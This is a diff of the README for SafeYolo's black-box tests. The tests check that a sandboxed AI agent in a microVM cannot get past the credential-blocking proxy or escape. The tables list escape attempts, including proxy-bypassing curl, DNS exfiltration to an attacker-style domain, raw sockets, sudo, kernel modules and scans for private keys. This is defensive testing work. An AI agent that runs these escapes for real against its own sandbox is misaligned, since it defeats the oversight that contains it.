@@ -1,48 +1,57 @@
 # Black Box Tests
 
-SafeYolo's trust anchor. These tests prove two things from the adversary's perspective:
+SafeYolo's trust anchor. These tests prove two things:
 
 1. **SafeYolo does what it claims** — credentials are blocked, domains are enforced, rate limits work
-2. **A malicious agent cannot escape** — network bypass, privilege escalation, key theft, and other pentest-style attacks are tested
+2. **A malicious agent cannot escape** — network bypass, privilege escalation, key theft are tested
 
 If these tests pass, the security contract holds. If they fail, nothing else matters.
 
+## Execution Model
+
+Tests are split across two execution domains:
+
+**Host-side pytest** (`host/`) — proxy functional tests. Runs on the host where
+sinkhole, admin API, and proxy are directly accessible on localhost. Sends
+requests through the proxy and verifies what the sinkhole captured.
+
+**VM-side pytest** (`isolation/`) — isolation tests. Runs inside a real microVM
+via SSH. Probes network escape, privilege escalation, and filesystem isolation
+from the adversary's perspective.
+
+```
+Host (pytest)                          VM (pytest via SSH)
+├── proxy_client → proxy:8080          ├── test_vm_isolation.py
+├── sinkhole.get_requests() → :19999   │   ├── curl --noproxy '*' ...
+├── admin_client → :9090               │   ├── os.getuid() != 0
+└── no VM interaction needed           │   ├── socket.SOCK_RAW fails
+                                       │   └── /dev/mem not found
+                                       └── test_key_isolation.py
+                                           ├── cert exists & readable
+                                           ├── no .key files
+                                           └── full filesystem scan
+```
+
 ## Design Principles
 
-**Test from inside the VM.** Every security assertion is proven from the adversary's
-vantage point — inside the microVM where the agent runs. If the attacker can't get out,
-the implementation is correct regardless of which mechanism enforces it.
+**Host tests verify the proxy, VM tests verify isolation.** The host has
+access to the sinkhole control API and admin API. The VM's firewall correctly
+blocks both — which is a security property we test, not a problem to work around.
 
-**Platform-independent assertions.** The guest is always Linux. A test that runs
-`curl --noproxy '*' http://1.1.1.1` doesn't know or care whether pf (macOS) or
-iptables (Linux) dropped the packet. Test files assert outcomes, never mechanisms.
-They must never contain `if platform == ...` branches.
+**Platform-independent assertions.** Tests assert outcomes, never mechanisms.
+`curl --noproxy '*' http://1.1.1.1` fails regardless of whether pf or
+iptables dropped it.
 
-**Platform-specific harness only.** The only platform-dependent code is the thin
-harness layer that stands up the VM, proxy, sinkhole, and network isolation.
-Everything else — test files, fixtures, sinkhole client, assertions — is shared.
+**Never duplicate production logic.** Tests use the real proxy, real addons,
+real firewall rules, real TLS. No mocks, no shortcuts.
 
-| Layer | Shared or Platform-specific |
-|-------|----------------------------|
-| Test files (`test_*.py`) | Shared |
-| Fixtures (`conftest.py`) | Shared |
-| Sinkhole server | Shared |
-| Certificates | Shared |
-| VM + network harness (`run-tests.sh`) | Platform-specific |
-
-**Never duplicate production logic.** Tests use the real proxy with real addons, real
-firewall rules, real VirtioFS mounts, and real TLS verification. No mocks, no
-`ssl_insecure=true`, no shortcuts. A fix to production automatically fixes the tests.
-
-**Ground truth TLS.** The test harness uses a dedicated test CA that signs sinkhole
-certificates. SafeYolo verifies these the same way it verifies production certs.
-See `certs/README.md` for details.
+**Ground truth TLS.** A dedicated test CA signs sinkhole certificates.
+The proxy verifies these the same way it verifies production certs.
+See `certs/README.md`.
 
 ## Test Suites
 
-### Suite 1: Proxy Functional Tests
-
-Prove that the proxy inspects and enforces policy on all traffic.
+### Proxy Functional Tests (`host/`)
 
 | Test | Attack Scenario | Security Property |
 |------|----------------|-------------------|
@@ -54,84 +63,23 @@ Prove that the proxy inspects and enforces policy on all traffic.
 | Proxy-Authorization header | Header exfiltration | Stripped before forwarding |
 | Block response content | Audit trail | Contains event_id and approval guidance |
 
-**Verification method:** Sinkhole server captures all upstream traffic. Tests query the
-sinkhole to prove what actually reached the upstream — not what the proxy *said* it blocked.
-
-### Suite 2: VM Isolation Tests
-
-Prove that a malicious agent inside the microVM cannot escape the sandbox. These tests
-run from inside a real microVM with the same configuration as production.
-
-#### Network Escape
+### VM Isolation Tests (`isolation/`)
 
 | Test | Attack Vector | Expected Result |
 |------|--------------|-----------------|
-| Direct HTTP to external IP | `curl --noproxy '*' http://1.1.1.1` | Connection dropped (firewall) |
-| Direct HTTPS to external IP | `curl --noproxy '*' https://8.8.8.8` | Connection dropped (firewall) |
-| DNS exfiltration | `nslookup secret.attacker.com 8.8.8.8` | No route (firewall blocks UDP) |
-| Raw socket bypass | `SOCK_RAW` to external IP | Dropped at kernel level |
-| IP reconfiguration | `ip addr` change to evade firewall | Firewall matches original subnet |
-| Proxy reachable | `curl` through proxy | 200 (the one allowed path) |
-
-#### Privilege Escalation
-
-| Test | Attack Vector | Expected Result |
-|------|--------------|-----------------|
-| Run as non-root | Check `id -u` | uid 1000 |
-| sudo escalation | `sudo su` | No password, no NOPASSWD |
-| Kernel module load | `insmod` / `modprobe` | `CONFIG_MODULES=n` — not supported |
-| /dev/mem access | Read physical memory | Device does not exist |
-| eBPF load | BPF syscall | Not available in guest |
-
-#### Filesystem Isolation
-
-| Test | Attack Vector | Expected Result |
-|------|--------------|-----------------|
-| Write to config share | `touch /safeyolo/test` | EROFS (read-only) |
-| Read CA private key | Scan all mounted filesystems | Not present in VM |
-| Private key in cert content | `grep "PRIVATE KEY"` in cert files | Not found |
-| Public cert exists | Check trust store | Present and readable |
-
-### Suite 3: Key Isolation Tests
-
-Prove that the CA private key never enters the VM. This is critical — if an agent obtains
-the private key, it can sign certificates for any domain and bypass all inspection.
-
-| Test | Attack Vector | Expected Result |
-|------|--------------|-----------------|
-| No `.key` files in VM | Scan all mounted volumes | None found |
-| No private key in cert files | Content scan of all `.pem`/`.crt` files | No `PRIVATE KEY` block |
-| Public cert present | Check `/usr/local/share/ca-certificates/` | `safeyolo.crt` exists |
-| Public cert readable | Read cert as agent user | Contains `BEGIN CERTIFICATE` |
-
-## Architecture
-
-```
-┌─────────────────────────────────┐
-│  microVM (agent perspective)    │
-│                                 │
-│  ┌──────────┐  ┌─────────────┐ │
-│  │  Agent    │  │ Test runner │ │
-│  │ (or bash) │  │ (pytest)   │ │
-│  └────┬──────┘  └──────┬──────┘ │
-│       │ HTTP_PROXY     │        │
-│  ─────┼────────────────┼──────  │
-│       │    eth0         │       │
-└───────┼─────────────────┼───────┘
-        │ firewall rules  │
-        ▼                 ▼
-┌───────────────┐  ┌─────────────┐
-│  mitmdump     │  │  Sinkhole   │
-│  (host)       │──│  (captures) │
-│  + addons     │  │             │
-└───────────────┘  └─────────────┘
-```
-
-- **microVM**: Real VM, same config as production (Virtualization.framework on macOS, KVM on Linux)
-- **mitmdump**: Host-side proxy with full addon chain (credential guard, network guard, etc.)
-- **Sinkhole**: Captures upstream traffic to prove what actually reached the destination
-- **Firewall**: Host-side packet filter enforcing network isolation (pf on macOS, iptables/nftables on Linux)
-- **Test runner**: pytest inside the VM, proving security properties from the adversary's perspective
+| Direct HTTP bypass | `curl --noproxy '*' http://1.1.1.1` | Connection dropped |
+| Direct HTTPS bypass | `curl --noproxy '*' https://8.8.8.8` | Connection dropped |
+| DNS exfiltration | UDP to 8.8.8.8:53 | Blocked |
+| Raw socket | `SOCK_RAW` ICMP | PermissionError |
+| Proxy reachable | `curl` through proxy | 200 |
+| Non-root | `id -u` | 1000 |
+| No sudo | `sudo -n id` | Fails |
+| No kernel modules | `modprobe dummy` | Fails |
+| No /dev/mem | Check path | Not found |
+| No eBPF | BPF syscall | Returns -1 |
+| Config share read-only | Write to /safeyolo | EROFS |
+| No private keys | Filesystem scan | No PRIVATE KEY found |
+| Public cert present | Check trust store | safeyolo.crt exists |
 
 ## Running
 
@@ -139,20 +87,22 @@ the private key, it can sign certificates for any domain and bypass all inspecti
 # All suites
 ./run-tests.sh
 
-# Proxy functional tests only
+# Proxy functional tests only (host-side)
 ./run-tests.sh --proxy
 
-# VM isolation tests only
+# VM isolation tests only (in-VM)
 ./run-tests.sh --isolation
+
+# Verbose
+./run-tests.sh --verbose
 ```
 
 ## Adding Tests
 
 When adding a new test, ask: *"What would a malicious agent try?"*
 
-1. Identify the attack vector (network bypass, privilege escalation, data exfiltration, etc.)
-2. Write the test from inside the VM — prove the attack fails
-3. If the test involves upstream traffic, use the sinkhole to verify what actually arrived
-4. Assert the outcome, not the mechanism — never reference pf, iptables, feth, or any
-   platform-specific detail in test files
-5. Add the test to the appropriate suite above
+- **Proxy tests** go in `host/` — if you need to verify what reached upstream
+  via the sinkhole, or test proxy policy decisions
+- **Isolation tests** go in `isolation/` — if you're testing what an agent
+  can or cannot do from inside the VM
+- Assert outcomes, not mechanisms — never reference pf, iptables, or feth
